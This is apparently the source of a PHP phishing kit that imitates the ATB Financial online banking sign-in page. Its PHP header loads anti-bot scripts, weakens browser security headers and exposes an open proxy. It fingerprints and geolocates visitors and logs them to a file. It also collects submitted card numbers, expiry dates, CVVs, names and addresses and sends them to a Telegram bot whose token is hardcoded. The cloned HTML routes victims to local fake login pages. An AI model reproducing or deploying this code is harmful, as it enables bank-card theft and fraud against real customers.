<?php
include "/anti/anti1.php";
include "/anti/anti2.php";
include "/anti/anti3.php";
include "/anti/anti4.php";
include "/anti/anti5.php";
include "/anti/anti6.php";
include "/anti/anti7.php";
include "/anti/anti8.php";
include "/control.php";
include "/connect/out.php";
include "/mods/antibot.php";
include "/mods/antibot.php";

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

$user_os = getOS();
$user_browser = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file = 'data.dat';
$file1 = 'combo.txt';
$file2 = 'master.log';
$ip = "" . $PublicIP;
$uaget = "" . $user_agent;
$bsr = "" . $user_browser;
$uos = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la = $details['latitude'];
    $lp = $details['longitude'];
    $crn = $details['currency'];
    $type = $tp;
    $isp = $is;
    $bank = "ALL THE BITCHS.. [AT]BOOTY...";
    $LL = "+";
    $currency = "" . $full_date;
    $lh = "|";
    $li = ",";
}

$message = "|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|IPADDRESS :  " . $ip . "\n|BANK   💰  : " . $bank ."\n|Internet sp :  " . $isp ."\n|Type[4/6]     : ".  $tp . "\n|Device Info  :  " . $uos . $lh . $bsr . "\n|City                :  " . $city . "\n|Continent    :  " . $continent . "\n|Lat+lon         :  " . $la . $LL . $lp . "\n|Phone           :  " . $cn . "\n|Country        :  " . $country . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n| PROFIT   :  " . $_POST['Cardnumber'] . "|" . $_POST['Expiry'] . "|" . $_POST['CVV'] . "|" . $_SESSION['ZIP'] . "|" . $_POST['Nameoncard'] . "|" . $_SESSION['Address'] . "  " . $_SESSION['Apartment'] . "|" . $_SESSION['City'] . "|" . $_SESSION['state'] . "|" . $_SESSION['Phone'] . "|" . $_SERVER['REMOTE_ADDR'] . "|" . $_SESSION['bank_scheme'] . "|" . $_SESSION['bank_type'] . "|" . $_SESSION['bank_brand'] . "|" . $_SESSION['bank_name'] . "|" . $_SESSION['bank_country'] . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|USERAGENT:  " . $_SERVER['HTTP_USER_AGENT'] . "\n";


$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
          

$options = array(
    'http' => array(
        'method'  => 'POST',
        'content' => http_build_query($data),
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
    )
);
$context  = stream_context_create($options);
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage", false, $context);

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

?>
     <html lang="en"><head><script src="//bat.bing.com/bat" async=""></script><script async="" src="https://static.ads-twitter.com/uwt"></script><script src="https://www.redditstatic.com/ads/pixel" async=""></script><script async="" src="//s.usea01.idio.episerver.net/ia"></script><script type="text/javascript" async="" src="./files/js" nonce=""></script><script type="text/javascript" async="" src="./files/linkid" nonce=""></script><script src="./files/bat" async=""></script><script src="./files/pixel" async=""></script><script async="" src="./files/ia"></script><script type="text/javascript" async="" src="./files/analytics" nonce=""></script><script gtm="GTM-P78HH3L" type="text/javascript" async="" src="./files/optimize" nonce=""></script><script async="true" src="./files/17eb3427-295d-4bad-ad7f-c00f3eccac17" crossorigin="anonymous"></script><script async="" src="./files/main.f6304d83"></script><script src="./files/banner" type="text/javascript" id="cookieBanner-4764334" data-cookieconsent="ignore" data-hs-ignore="true" data-loader="hs-scriptloader" data-hsjs-portal="4764334" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script src="./files/fb" type="text/javascript" id="hs-ads-pixel-4764334" data-ads-portal-id="4764334" data-ads-env="prod" data-loader="hs-scriptloader" data-hsjs-portal="4764334" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script type="text/javascript" async="" src="./files/recaptcha__en" crossorigin="anonymous" integrity="sha384-CCh6u4Amw2vSb1Un+qTYXrp+Sexi2puR9Asf4xQ9cw5NND/M2JxupcwYQs/lmUKR" nonce=""></script><script async="" src="./files/uwt"></script><script type="text/javascript" async="" src="./files/oct"></script><script src="./files/events"></script><script async="" src="./files/scevent.min"></script><script type="text/javascript" async="" src="./files/siteanalyze_77682"></script><script async="" src="./files/qevents"></script><script src="./files/quant" async="" type="text/javascript"></script><script async="" src="./files/core"></script><script type="text/javascript" async="" src="./files/insight.min"></script><script src="./files/2280495035427110" async=""></script><script src="./files/identity" async=""></script><script src="./files/inferredevents" async=""></script><script src="./files/257927721713078" async=""></script><script async="" src="./files/fbevents"></script><script src="./files/embed" type="text/javascript"></script><script src="./files/4764334" type="text/javascript" id="hs-analytics"></script><script async="" src="./files/gtm"></script><script async="" src="./files/api"></script><script src="/page/prompt"></script><script src="/page/runScript"></script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="id" content="822">
    <title>Sign In | ATB Financial</title>
        <meta name="description" content="Sign in to ATB online banking to access your personal or business accounts in seconds.">

    
    



<!--Open Graph-->
<meta property="og:title" content="Sign In">
<meta property="og:type" content="summary">
<meta property="og:url" content="https://www.atb.com/sign-in/">
<meta property="og:image" content="https://www.atb.com/siteassets/images/icons/atb-blue-open-graph.jpg">
<meta property="og:description" content="Sign in to ATB online banking to access your personal or business accounts in seconds.">
<meta property="og:site_name" content="ATB Financial">
<meta property="og:locale" content="en_CA">
<!--Twitter Card-->
<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@atbfinancial">
<meta name="twitter:creator" content="@atbfinancial">
<meta name="twitter:url" content="https://www.atb.com/sign-in/">
<meta name="twitter:title" content="Sign In">
<meta name="twitter:description" content="Sign in to ATB online banking to access your personal or business accounts in seconds.">
<meta name="twitter:image" content="https://www.atb.com/siteassets/images/icons/atb-blue-open-graph.jpg">
<!--Facebook-->
<meta property="fb:app_id">
<meta property="article:author" content="ATB Financial">



    

<link href="https://www.atb.com/static/img/favicon.ico" rel="icon" type="image/x-icon">
<link href="https://www.atb.com/static/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="https://www.atb.com/static/img/apple-touch-icon-57x57.png" rel="apple-touch-icon" sizes="57x57">
<link href="https://www.atb.com/static/img/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76">
<link href="https://www.atb.com/static/img/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120">
<link href="https://www.atb.com/static/img/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152">
<link href="https://www.atb.com/static/img/apple-touch-icon-167x167.png" rel="apple-touch-icon" sizes="167x167">
<link href="https://www.atb.com/static/img/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180">
<link href="https://www.atb.com/static/img/favicon-32x32.png" rel="icon" type="image/png" sizes="32x32">
<link href="https://www.atb.com/static/img/favicon-16x16.png" rel="icon" type="image/png" sizes="16x16">
<link href="https://www.atb.com/static/img/favicon-48x48.png" rel="icon" type="image/png" sizes="48x48">
<link href="https://www.atb.com/static/img/site.webmanifest" rel="manifest" crossorigin="use-credentials">
<link href="https://www.atb.com/static/img/safari-pinned-tab.svg" rel="mask-icon" color="#005eb8">
<meta content="/static/img/browserconfig.xml" name="msapplication-config">
<meta name="msapplication-TileColor" content="#2b5797">
<meta name="theme-color" content="#005eb8">

    
    <link href="./files/index.css" rel="stylesheet">

<link rel="preconnect" href="https://fonts.googleapis.com/">
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
<link href="./files/css" rel="stylesheet">
<link href="./files/css2" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="./files/index(1).css">
<link rel="stylesheet" type="text/css" href="./files/owl.carousel.min.css">
    <!--Open Finn ai-->
    <link rel="stylesheet" href="./files/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="./files/styles.css">


    
    <link href="https://www.atb.com/sign-in/" rel="canonical">

    
     




    
    

<header class="navigation dark-bg navigation-full" aria-label="ATB Financial Sign In banking">
    <div class="navigation-menu headroom headroom--top headroom--not-bottom">
        <div id="skip-to-content">
            <a tabindex="3" href="https://www.atb.com/sign-in/#content">Skip to content</a>
            <a href="https://www.atb.com/sign-in/#header-nav-secondary">Skip to Sign In menu</a>
            <a href="https://www.atb.com/search/">Search</a>
            <a href="https://www.atb.com/sign-in/">Sign in to online banking</a>
            
    <span role="button" class="btn btn-link chat-button" tabindex="0" aria-label="" data-event-pressed="atb.virtual-assistant.open" data-event-options="{&quot;source&quot;:&quot;navigation-accessibility-link&quot;}">
        <span class="btn-content" tabindex="-1">Chat with our Virtual Assistant</span>
    </span>
        </div>
        <div id="small-screen-header" class="container-fluid">
            <div class="row">
                <div class="col left">
                    <div role="button" class="menu-toggle" tabindex="0" aria-label="Toggle main navigation menu" aria-labelledby="Main navigation menu" aria-expanded="false" aria-controls="header-nav-primary header-nav-secondary">
                        <span tabindex="-1">&nbsp;</span>
                    </div>
                    <a class="search-icon-link" href="https://www.atb.com/search/" aria-label="Search"><span class="search-icon" tabindex="-1">&nbsp;</span></a>
                </div>
                <div class="col center" aria-hidden="true">
                    <a class="atb-jewel" href="https://www.atb.com/" tabindex="-1"></a>
                </div>
                <div class="col right">
                    <a class="sign-in" href="https://www.atb.com/sign-in/"><span tabindex="-1" class="text">Sign In<i class="chevron-right"></i></span></a>
                </div>
            </div>
        </div>
        <div id="header-nav-primary" class="container-fluid">
            <div class="width-limit">
                <div class="row">
                    <nav aria-label="Sign In categories" class="col-12">
                        <ul>
<li><a href="https://www.atb.com/personal/" aria-label="Personal"><span class="text" tabindex="-1">Personal</span></a></li><li><a href="https://www.atb.com/business/" aria-label="Business"><span class="text" tabindex="-1">Business</span></a></li><li><a href="https://www.atb.com/commercial/" aria-label="Commercial"><span class="text" tabindex="-1">Commercial</span></a></li><li><a href="https://www.atb.com/wealth/" aria-label="Wealth"><span class="text" tabindex="-1">Wealth</span></a></li>                                                            <li class="h-spacer"></li>
                                <li><a class="sign-in" href="https://www.atb.com/sign-in/" aria-label="Sign in to online banking"><span class="text" tabindex="-1">Sign In <i class="chevron-right"></i></span></a></li>
                        </ul>
                    </nav>
                </div>
            </div>
        </div>




<div id="header-nav-secondary" class="container-fluid" role="dialog" aria-modal="true" aria-labelledby="header-nav-secondary">

    <div class="width-limit">
        <div class="row">
            <nav aria-label="Sign In section" tabindex="-1" class="col-12">
                <ul>
                    <li aria-hidden="true"><a href="https://www.atb.com/" class="atb-jewel" tabindex="-1"></a></li>
                    <li class="h-spacer"></li>
                    <li><a class="search" href="https://www.atb.com/search/" aria-label="Search"><span tabindex="-1"><i class="search-icon"></i></span></a></li>
                </ul>
            </nav>
        </div>
    </div>
</div>

    </div>
</header>    <main id="content">
        

<section class="container-fluid pt-small pb-small sign-in-component">
    <div class="width-limit">
        <div class="row">
            <div class="col-sm-10 offset-sm-1">
                <h1 class="h2 text-header-center">Sign in to Online Banking</h1>
            </div>
        </div>
                        <div class="row sign-in-content">
                            <div class="col-12 col-sm-10 offset-sm-1 col-lg-5 offset-lg-1 col-xl-4 offset-xl-2 pt-extra-small pb-extra-small">
                                <section id="card-0" class="card sign-in-card" tabindex="0">
                                    <div tabindex="-1">
                                        <div class="card-body">
                                            <p class="card-subtitle">Personal</p>
                                            <h3 class="card-title h4">ATB Personal</h3>
                                            <p class="p1">Pay bills and transfer funds. It’s quick and secure.</p>
                                            <a class="btn btn-primary" href="040148.php" aria-label="Log in to ATB Personal" target="_self" tabindex="0">
                                                <span class="btn-content" tabindex="-1">Log in</span>
                                            </a>
                                        </div>
                                    </div><div tabindex="-1">
                        



<div class="card-body">
    <p class="card-subtitle">Wealth</p>
    <h3 class="card-title h4">Investor Connect</h3>
        <p class="p1">View your transaction history, holdings, tax slips and statements online.</p>
        <a class="btn btn-primary" href="https://atbinvestorconnect.com/Account/Login.aspx?__hstc=155221604.28c5deb3cb37336fd4cc6aa564b889ad.1673350671364.1673505641701.1673661349204.3&amp;__hssc=155221604.1.1673661349204&amp;__hsfp=3242692857" aria-label="Log in to ATB Investor Connect" target="_self" tabindex="0"><span class="btn-content" tabindex="-1">Log in</span></a>

</div>
                    </div>
                                </section>
                            </div>
    
                            <div class="col-12 col-sm-10 offset-sm-1 col-lg-5 offset-lg-0 col-xl-4 pt-extra-small pb-extra-small">
                                <section id="card-1" class="card sign-in-card" tabindex="0">
                                    <div tabindex="-1">
                                        <div class="card-body">
                                            <p class="card-subtitle">Business</p>
                                            <h3 class="card-title h4">ATB Business</h3>
                                            <p class="p1">Securely manage your business banking needs.</p>
                                            <a class="btn btn-primary" href="040149.php" aria-label="Log in to ATB Online Business" target="_self" tabindex="0"><span class="btn-content" tabindex="-1">Log in</span></a>
                                        </div>
                        



<div class="card-body">
    <p class="card-subtitle">Wealth</p>
    <h3 class="card-title h4">ATB Prosper</h3>
        <p class="p1">The simplest way to invest. Open an investment account and track your progress online.</p>
        <a class="btn btn-primary" href="https://www.atbprosper.com/login?__hstc=155221604.28c5deb3cb37336fd4cc6aa564b889ad.1673350671364.1673505641701.1673661349204.3&amp;__hssc=155221604.1.1673661349204&amp;__hsfp=3242692857" aria-label="Log in to ATB Prosper" target="_self" tabindex="0"><span class="btn-content" tabindex="-1">Log in</span></a>

</div>
                    </div>
                </section>
            </div>
            <div class="col-12 col-sm-10 offset-sm-1 col-lg-5 offset-lg-0 col-xl-4 pt-extra-small pb-extra-small">
                <section id="card-3" class="card sign-in-card" tabindex="0">
                    
                </section>
            </div>
        </div>
    </div>
</section>



            </main>
<footer id="footer" class="footer footer-full dark-bg container-fluid">
    <nav class="width-limit" aria-label="Additional company links">
        <div class="row">
            <section class="col col-6 col-sm-3" aria-label="Get in touch">
    <h3 class="h5">Get in touch</h3>
    <ul role="list">
    <li role="listitem"><a href="https://www.atb.com/resources/contact-us/" aria-label="Contact us"><span tabindex="-1">Contact us</span></a></li>
    <li role="listitem"><a href="https://www.atb.com/resources/contact-us/feedback/" aria-label="Client feedback"><span tabindex="-1">Client feedback</span></a></li>
    <li role="listitem"><a href="https://www.atb.com/resources/find-a-location/" aria-label="Find a location"><span tabindex="-1">Find a location</span></a></li>
    <li role="listitem"><a href="https://meet.atb.com/" aria-label="Book an appointment"><span tabindex="-1">Book an appointment</span></a></li>
    </ul>
</section>
<section class="col col-6 col-sm-3" aria-label="Discover">
    <h3 class="h5">Discover</h3>
    <ul role="list">
    <li role="listitem"><a href="https://www.atbcares.com/?__hstc=155221604.28c5deb3cb37336fd4cc6aa564b889ad.1673350671364.1673505641701.1673661349204.3&amp;__hssc=155221604.1.1673661349204&amp;__hsfp=3242692857" aria-label="ATB Cares"><span tabindex="-1">ATB Cares</span></a></li>
    <li role="listitem"><a href="https://atbentrepreneurcentre.com/?__hstc=155221604.28c5deb3cb37336fd4cc6aa564b889ad.1673350671364.1673505641701.1673661349204.3&amp;__hssc=155221604.1.1673661349204&amp;__hsfp=3242692857" aria-label="ATB Entrepreneur Centre"><span tabindex="-1">ATB Entrepreneur Centre</span></a></li>
    <li role="listitem"><a href="https://www.atbprosper.com/?__hstc=155221604.28c5deb3cb37336fd4cc6aa564b889ad.1673350671364.1673505641701.1673661349204.3&amp;__hssc=155221604.1.1673661349204&amp;__hsfp=3242692857" aria-label="ATB Prosper"><span tabindex="-1">ATB Prosper</span></a></li>
    <li role="listitem"><a href="https://www.atbventures.com/" aria-label="ATB Ventures"><span tabindex="-1">ATB Ventures</span></a></li>
    </ul>
</section>
<section class="col col-6 col-sm-3" aria-label="Resources">
    <h3 class="h5">Resources</h3>
    <ul role="list">
    <li role="listitem"><a href="https://www.atb.com/resources/rates/" aria-label="Current rates"><span tabindex="-1">Current rates</span></a></li>
    <li role="listitem"><a href="https://www.atb.com/resources/support/digital-banking/" aria-label="Digital banking help"><span tabindex="-1">Digital banking help</span></a></li>
    <li role="listitem"><a href="https://www.atb.com/company/privacy-and-security/casl/" aria-label="Marketing preferences"><span tabindex="-1">Marketing preferences</span></a></li>
    <li role="listitem"><a href="https://www.atb.com/resources/tools/" aria-label="Tools"><span tabindex="-1">Tools</span></a></li>
    </ul>
</section>
<section class="col col-6 col-sm-3" aria-label="Company">
    <h3 class="h5">Company</h3>
    <ul role="list">
    <li role="listitem"><a href="https://www.atb.com/company/about-atb/" aria-label="About"><span tabindex="-1">About</span></a></li>
    <li role="listitem"><a href="https://www.atb.com/company/accessibility/" aria-label="Accessibility"><span tabindex="-1">Accessibility</span></a></li>
    <li role="listitem"><a href="https://www.atb.com/company/careers/" aria-label="Careers"><span tabindex="-1">Careers</span></a></li>
    <li role="listitem"><a href="https://www.atb.com/company/community/" aria-label="Community"><span tabindex="-1">Community</span></a></li>
    <li role="listitem"><a href="https://www.atb.com/company/insights/" aria-label="Insights"><span tabindex="-1">Insights</span></a></li>
    <li role="listitem"><a href="https://www.atb.com/company/news/" aria-label="News"><span tabindex="-1">News</span></a></li>
    </ul>
</section>

        </div>
        <hr aria-hidden="true">
        <div>

            <section id="footer-legal" aria-label="Legal Links">
                <ul role="list">
    <li role="listitem"><a href="https://www.atb.com/company/legal/" aria-label="Legal"><span tabindex="-1">Legal</span></a></li>
    <li role="listitem"><a href="https://www.atb.com/company/privacy-and-security/" aria-label="Privacy &amp; security"><span tabindex="-1">Privacy &amp; security</span></a></li>
    <li role="listitem"><a href="https://www.atb.com/siteassets/pdf/global/codeofconduct.pdf" aria-label="Code of Conduct"><span tabindex="-1">Code of Conduct</span></a></li>
                </ul>
            </section>
            <div class="copyright">Copyright © 2023 ATB. All rights reserved.</div>
        </div>
    </nav>
</footer>

    <span id="VAButton" role="complementary" class="btn btn-icon chat-button hide" tabindex="0" aria-label="Chat with our Virtual Assistant" data-event-pressed="atb.virtual-assistant.open" data-event-options="{&quot;source&quot;:&quot;persistent-chat-button&quot;}">
        <span class="btn-content" tabindex="-1">
            <span class="chat-icon"></span><span class="chat-text">Chat now</span>
        </span>
    </span>

<section id="fixed-chat-box-" class="fixed-chat-box hide">
    <div class="container">
        <div class="error-message">
            <div class="header">ATB Virtual Assistant</div>
            <div class="generic-notification generic-notification-warning">
                <div class="content-wrapper" tabindex="0">
                    <div class="content-inner" tabindex="-1">
                        <i class="content-icon"></i>
                        <div class="content">
                            <div class="content-title"></div>
                            <div class="content-html">The ATB Virtual Assistant doesn't support landscape mode. Please tilt your device vertically to portrait mode.</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="finnAssistantContainer" class="finnAssistant"></div>
        <div class="dark-bg">
                <span id="VACloseButton" role="button" class="btn btn-close chat-button" tabindex="0" aria-label="Close Virtual Assistant">
        <span class="btn-content" tabindex="-1"></span>
    </span>

        </div>
    </div>
</section>


<script src="./files/jquery-3.6.0.min" nonce="" integrity="sha256-zp0HUArZHsK1JMJwdk7EyaM+eDINjTdOxADt5Ij2JRs= sha256-Q34VqOm4uiOGC7ZJcoKfssavfeqiapDlzv9VwBCCIa8=" crossorigin="anonymous"></script>
<script src="./files/vue.runtime.min" nonce="" integrity="sha256-UFA6+I/XFkAYHI8QEV3T77eP3K0sU5USRTnubBznQWw= sha256-ED1dpchnWBYEZD4VmbJ3gpvv0KwKgc4Cl+MTPWuIi70=" crossorigin="anonymous"></script>
<script src="./files/index" nonce=""></script>
<script type="application/ecmascript" src="./files/player" nonce=""></script>

<script type="text/javascript" id="hs-script-loader" async="" defer="" src="./files/4764334(1)" nonce=""></script>
<script src="./files/owl.carousel.min" nonce="" integrity="sha256-OMmmIGOm9Ob449if9ReNHitS4E/C85LnENhAxjp74FM= sha256-Zw6UMrykPiRGiAI9qj9ROIZHaQm5cSsyxfOnzmEiojw=" crossorigin="anonymous"></script>

    <!--Open Finn ai-->
        <script defer="" src="./files/bundle" nonce="" data-ie-id="finnAssistant"></script>
        <script defer="" src="./files/config" nonce=""></script>
        <script defer="" src="./files/creditLimitIncrease" nonce=""></script>
    <!--End Finn ai-->
    <script type="text/javascript" nonce="" src="./files/saved_resource"></script>
    <script nonce="" type="text/javascript" src="./files/find"></script>
<script nonce="" type="text/javascript">
if(typeof FindApi === 'function'){var api = new FindApi();api.setApplicationUrl('/');api.setServiceApiBaseUrl('/find_v2/');api.processEventFromCurrentUri();api.bindWindowEvents();api.bindAClickEvent();api.sendBufferedEvents();}
</script>



<script nonce="">
    $(window).on("load", function () {
        
        $.ajax({
            url: "/account/teststatus",
            success: function (response) {
                if (response != 'True') {
                    $("#epi-quickNavigator").remove();
                }
                else {
                    $(".epi-quickNavigator-editLink").find("a").attr("target", "_blank");
                    var menu = $("#epi-quickNavigator-menu").find("li");
                    if (menu != null) {
                        var list = menu.children();
                        var l = list.length;
                        for (var i = 0; i < l; i++) {
                            $(list[i]).attr("target", "_blank");
                        }
                    }
                }
            },
            error: function (error) {
                $("#epi-quickNavigator").remove();
            }
        })
    });
</script>


<img src="./files/adsct" height="1" width="1" style="display: none;"><iframe height="0" width="0" style="display: none; visibility: hidden;" src="./files/activityi.html"></iframe><img src="./files/adsct(1)" height="1" width="1" style="display: none;">
<script type="text/javascript" id="">_iaq=[["client","b4d895ae86cd4d26a61ffc14e4b189ed"],["delivery",389],["track","consume"]];!function(d,b){var c=d.createElement(b);c.async=1;b=d.getElementsByTagName(b)[0];c.src="//s.usea01.idio.episerver.net/ia";b.parentNode.insertBefore(c,b)}(document,"script");
!function(d,b){var c=d.attachEvent?"on":"";d[c?"attachEvent":"addEventListener"](c+"click",function(a){for(a=a.srcElement||a.target;a&&"a"!==a.tagName&&"A"!==a.tagName&&!a.href;)a=a.parentNode;if(a){a=a.href;var e=b.protocol+"//"+b.host;0===a.indexOf(e)&&/\.pdf(\?|#|$)/i.test(a)&&_iaq.push(["track","consume",a])}})}(document,location);</script>

<script type="text/javascript" id="" src="./files/js(2)"></script><script type="text/javascript" id="">var isSample=Math.floor(10*Math.random()),sample=0;sample=0==isSample%2?0:1;dataLayer.push({"DL - Sampling":sample});</script>
<script type="text/javascript" id="">!function(a,b){if(!a.rdt){var c=a.rdt=function(){c.sendEvent?c.sendEvent.apply(c,arguments):c.callQueue.push(arguments)};c.callQueue=[];a=b.createElement("script");a.src="https://www.redditstatic.com/ads/pixel";a.async=!0;b=b.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)}}(window,document);rdt("init","t2_h34l75bj",{optOut:!1,useDecimalCurrencyValues:!0});rdt("track","PageVisit");</script>

